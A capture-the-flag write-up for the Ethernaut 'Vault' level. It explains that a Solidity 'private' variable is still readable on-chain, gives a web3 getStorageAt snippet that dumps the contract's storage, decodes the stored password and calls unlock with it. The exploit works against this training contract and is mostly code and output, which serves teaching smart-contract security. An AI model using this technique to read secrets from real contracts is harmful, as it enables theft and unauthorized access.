## Ethernaut Level 08 - Vault - Write-Up
<!--Authors: OofedUp-->

Difficulty: 3/10

Objective: Unlock the Vault (make the `locked` variable `false`)

![image](https://i.imgur.com/D8qbink.png)

## Source
```javascript
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

In order to call the `unlock` function and solve the challenge we need the data inside the `password` variable. Too bad it's defined as *private*...

Defining a variable as *private* doesn't actually make it private (it's on the blockchain, nothing's private here). It only doesn't make it **callable**, but if we can access the contract's storage, we can extract the password.

Variables are stored in **slots** in contract storage. We can retrieve the storage and these slots using the web3's `getStorageAt()` function. Here's a quick js snippet I use for extracting contract storage:

```javascript
let variables = []
let promm = (i) => (err, res) => {
  variables[i] = res;
}
for(var i = 0; i < 6; i++){
web3.eth.getStorageAt(instance, i, promm(i))
}
```

Running the code we get a dump of the storage:

```javascript
0: "0x0000000000000000000000000000000000000000000000000000000000000001"
1: "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
2: "0x0000000000000000000000000000000000000000000000000000000000000000"
3: "0x0000000000000000000000000000000000000000000000000000000000000000"
4: "0x0000000000000000000000000000000000000000000000000000000000000000"
5: "0x0000000000000000000000000000000000000000000000000000000000000000"
length: 6
```

The first slot which is `0x000...001` is the `locked` variable which is true at first (that's why it's `1`). The second slot corresponds to the `password` variable. Let's convert it from hex to ascii:

![image](https://i.imgur.com/X2WTDgB.png)

We could have also looked in the initial transaction that initialized the contract:

![image](https://i.imgur.com/I86GlxP.png)

We have the password. We can unlock the "vault":

```javascript
contract.unlock("A very strong secret password :)")
```

Now the `locked` variable should be false:

![image](https://i.imgur.com/voQppqo.png)

We can submit the contract:

![image](https://i.imgur.com/PnhPpsU.png)
